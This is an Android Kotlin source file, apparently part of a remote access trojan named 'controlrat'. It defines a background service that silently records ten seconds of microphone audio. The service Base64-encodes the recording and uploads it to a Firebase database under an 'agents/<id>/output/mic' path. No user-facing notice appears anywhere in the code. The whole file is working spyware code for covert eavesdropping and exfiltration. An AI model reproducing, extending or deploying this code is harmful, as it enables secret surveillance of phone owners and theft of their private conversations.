package com.controlrat
import android.app.Service; import android.content.Intent; import android.media.MediaRecorder; import android.os.Handler; import android.os.IBinder; import android.util.Base64; import com.google.firebase.database.FirebaseDatabase; import java.io.File
class MicService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val appId = intent?.getStringExtra("appid") ?: "unknown"; val file = File(cacheDir, "rec.mp4")
        val rec = MediaRecorder().apply { setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); setAudioEncoder(MediaRecorder.AudioEncoder.AAC); setOutputFile(file.absolutePath); prepare(); start() }
        Handler(mainLooper).postDelayed({ rec.stop(); rec.release(); FirebaseDatabase.getInstance().getReference("agents/$appId/output/mic").setValue(Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)); stopSelf() }, 10000)
        return START_NOT_STICKY
    }
    override fun onBind(i: Intent?) = null
}
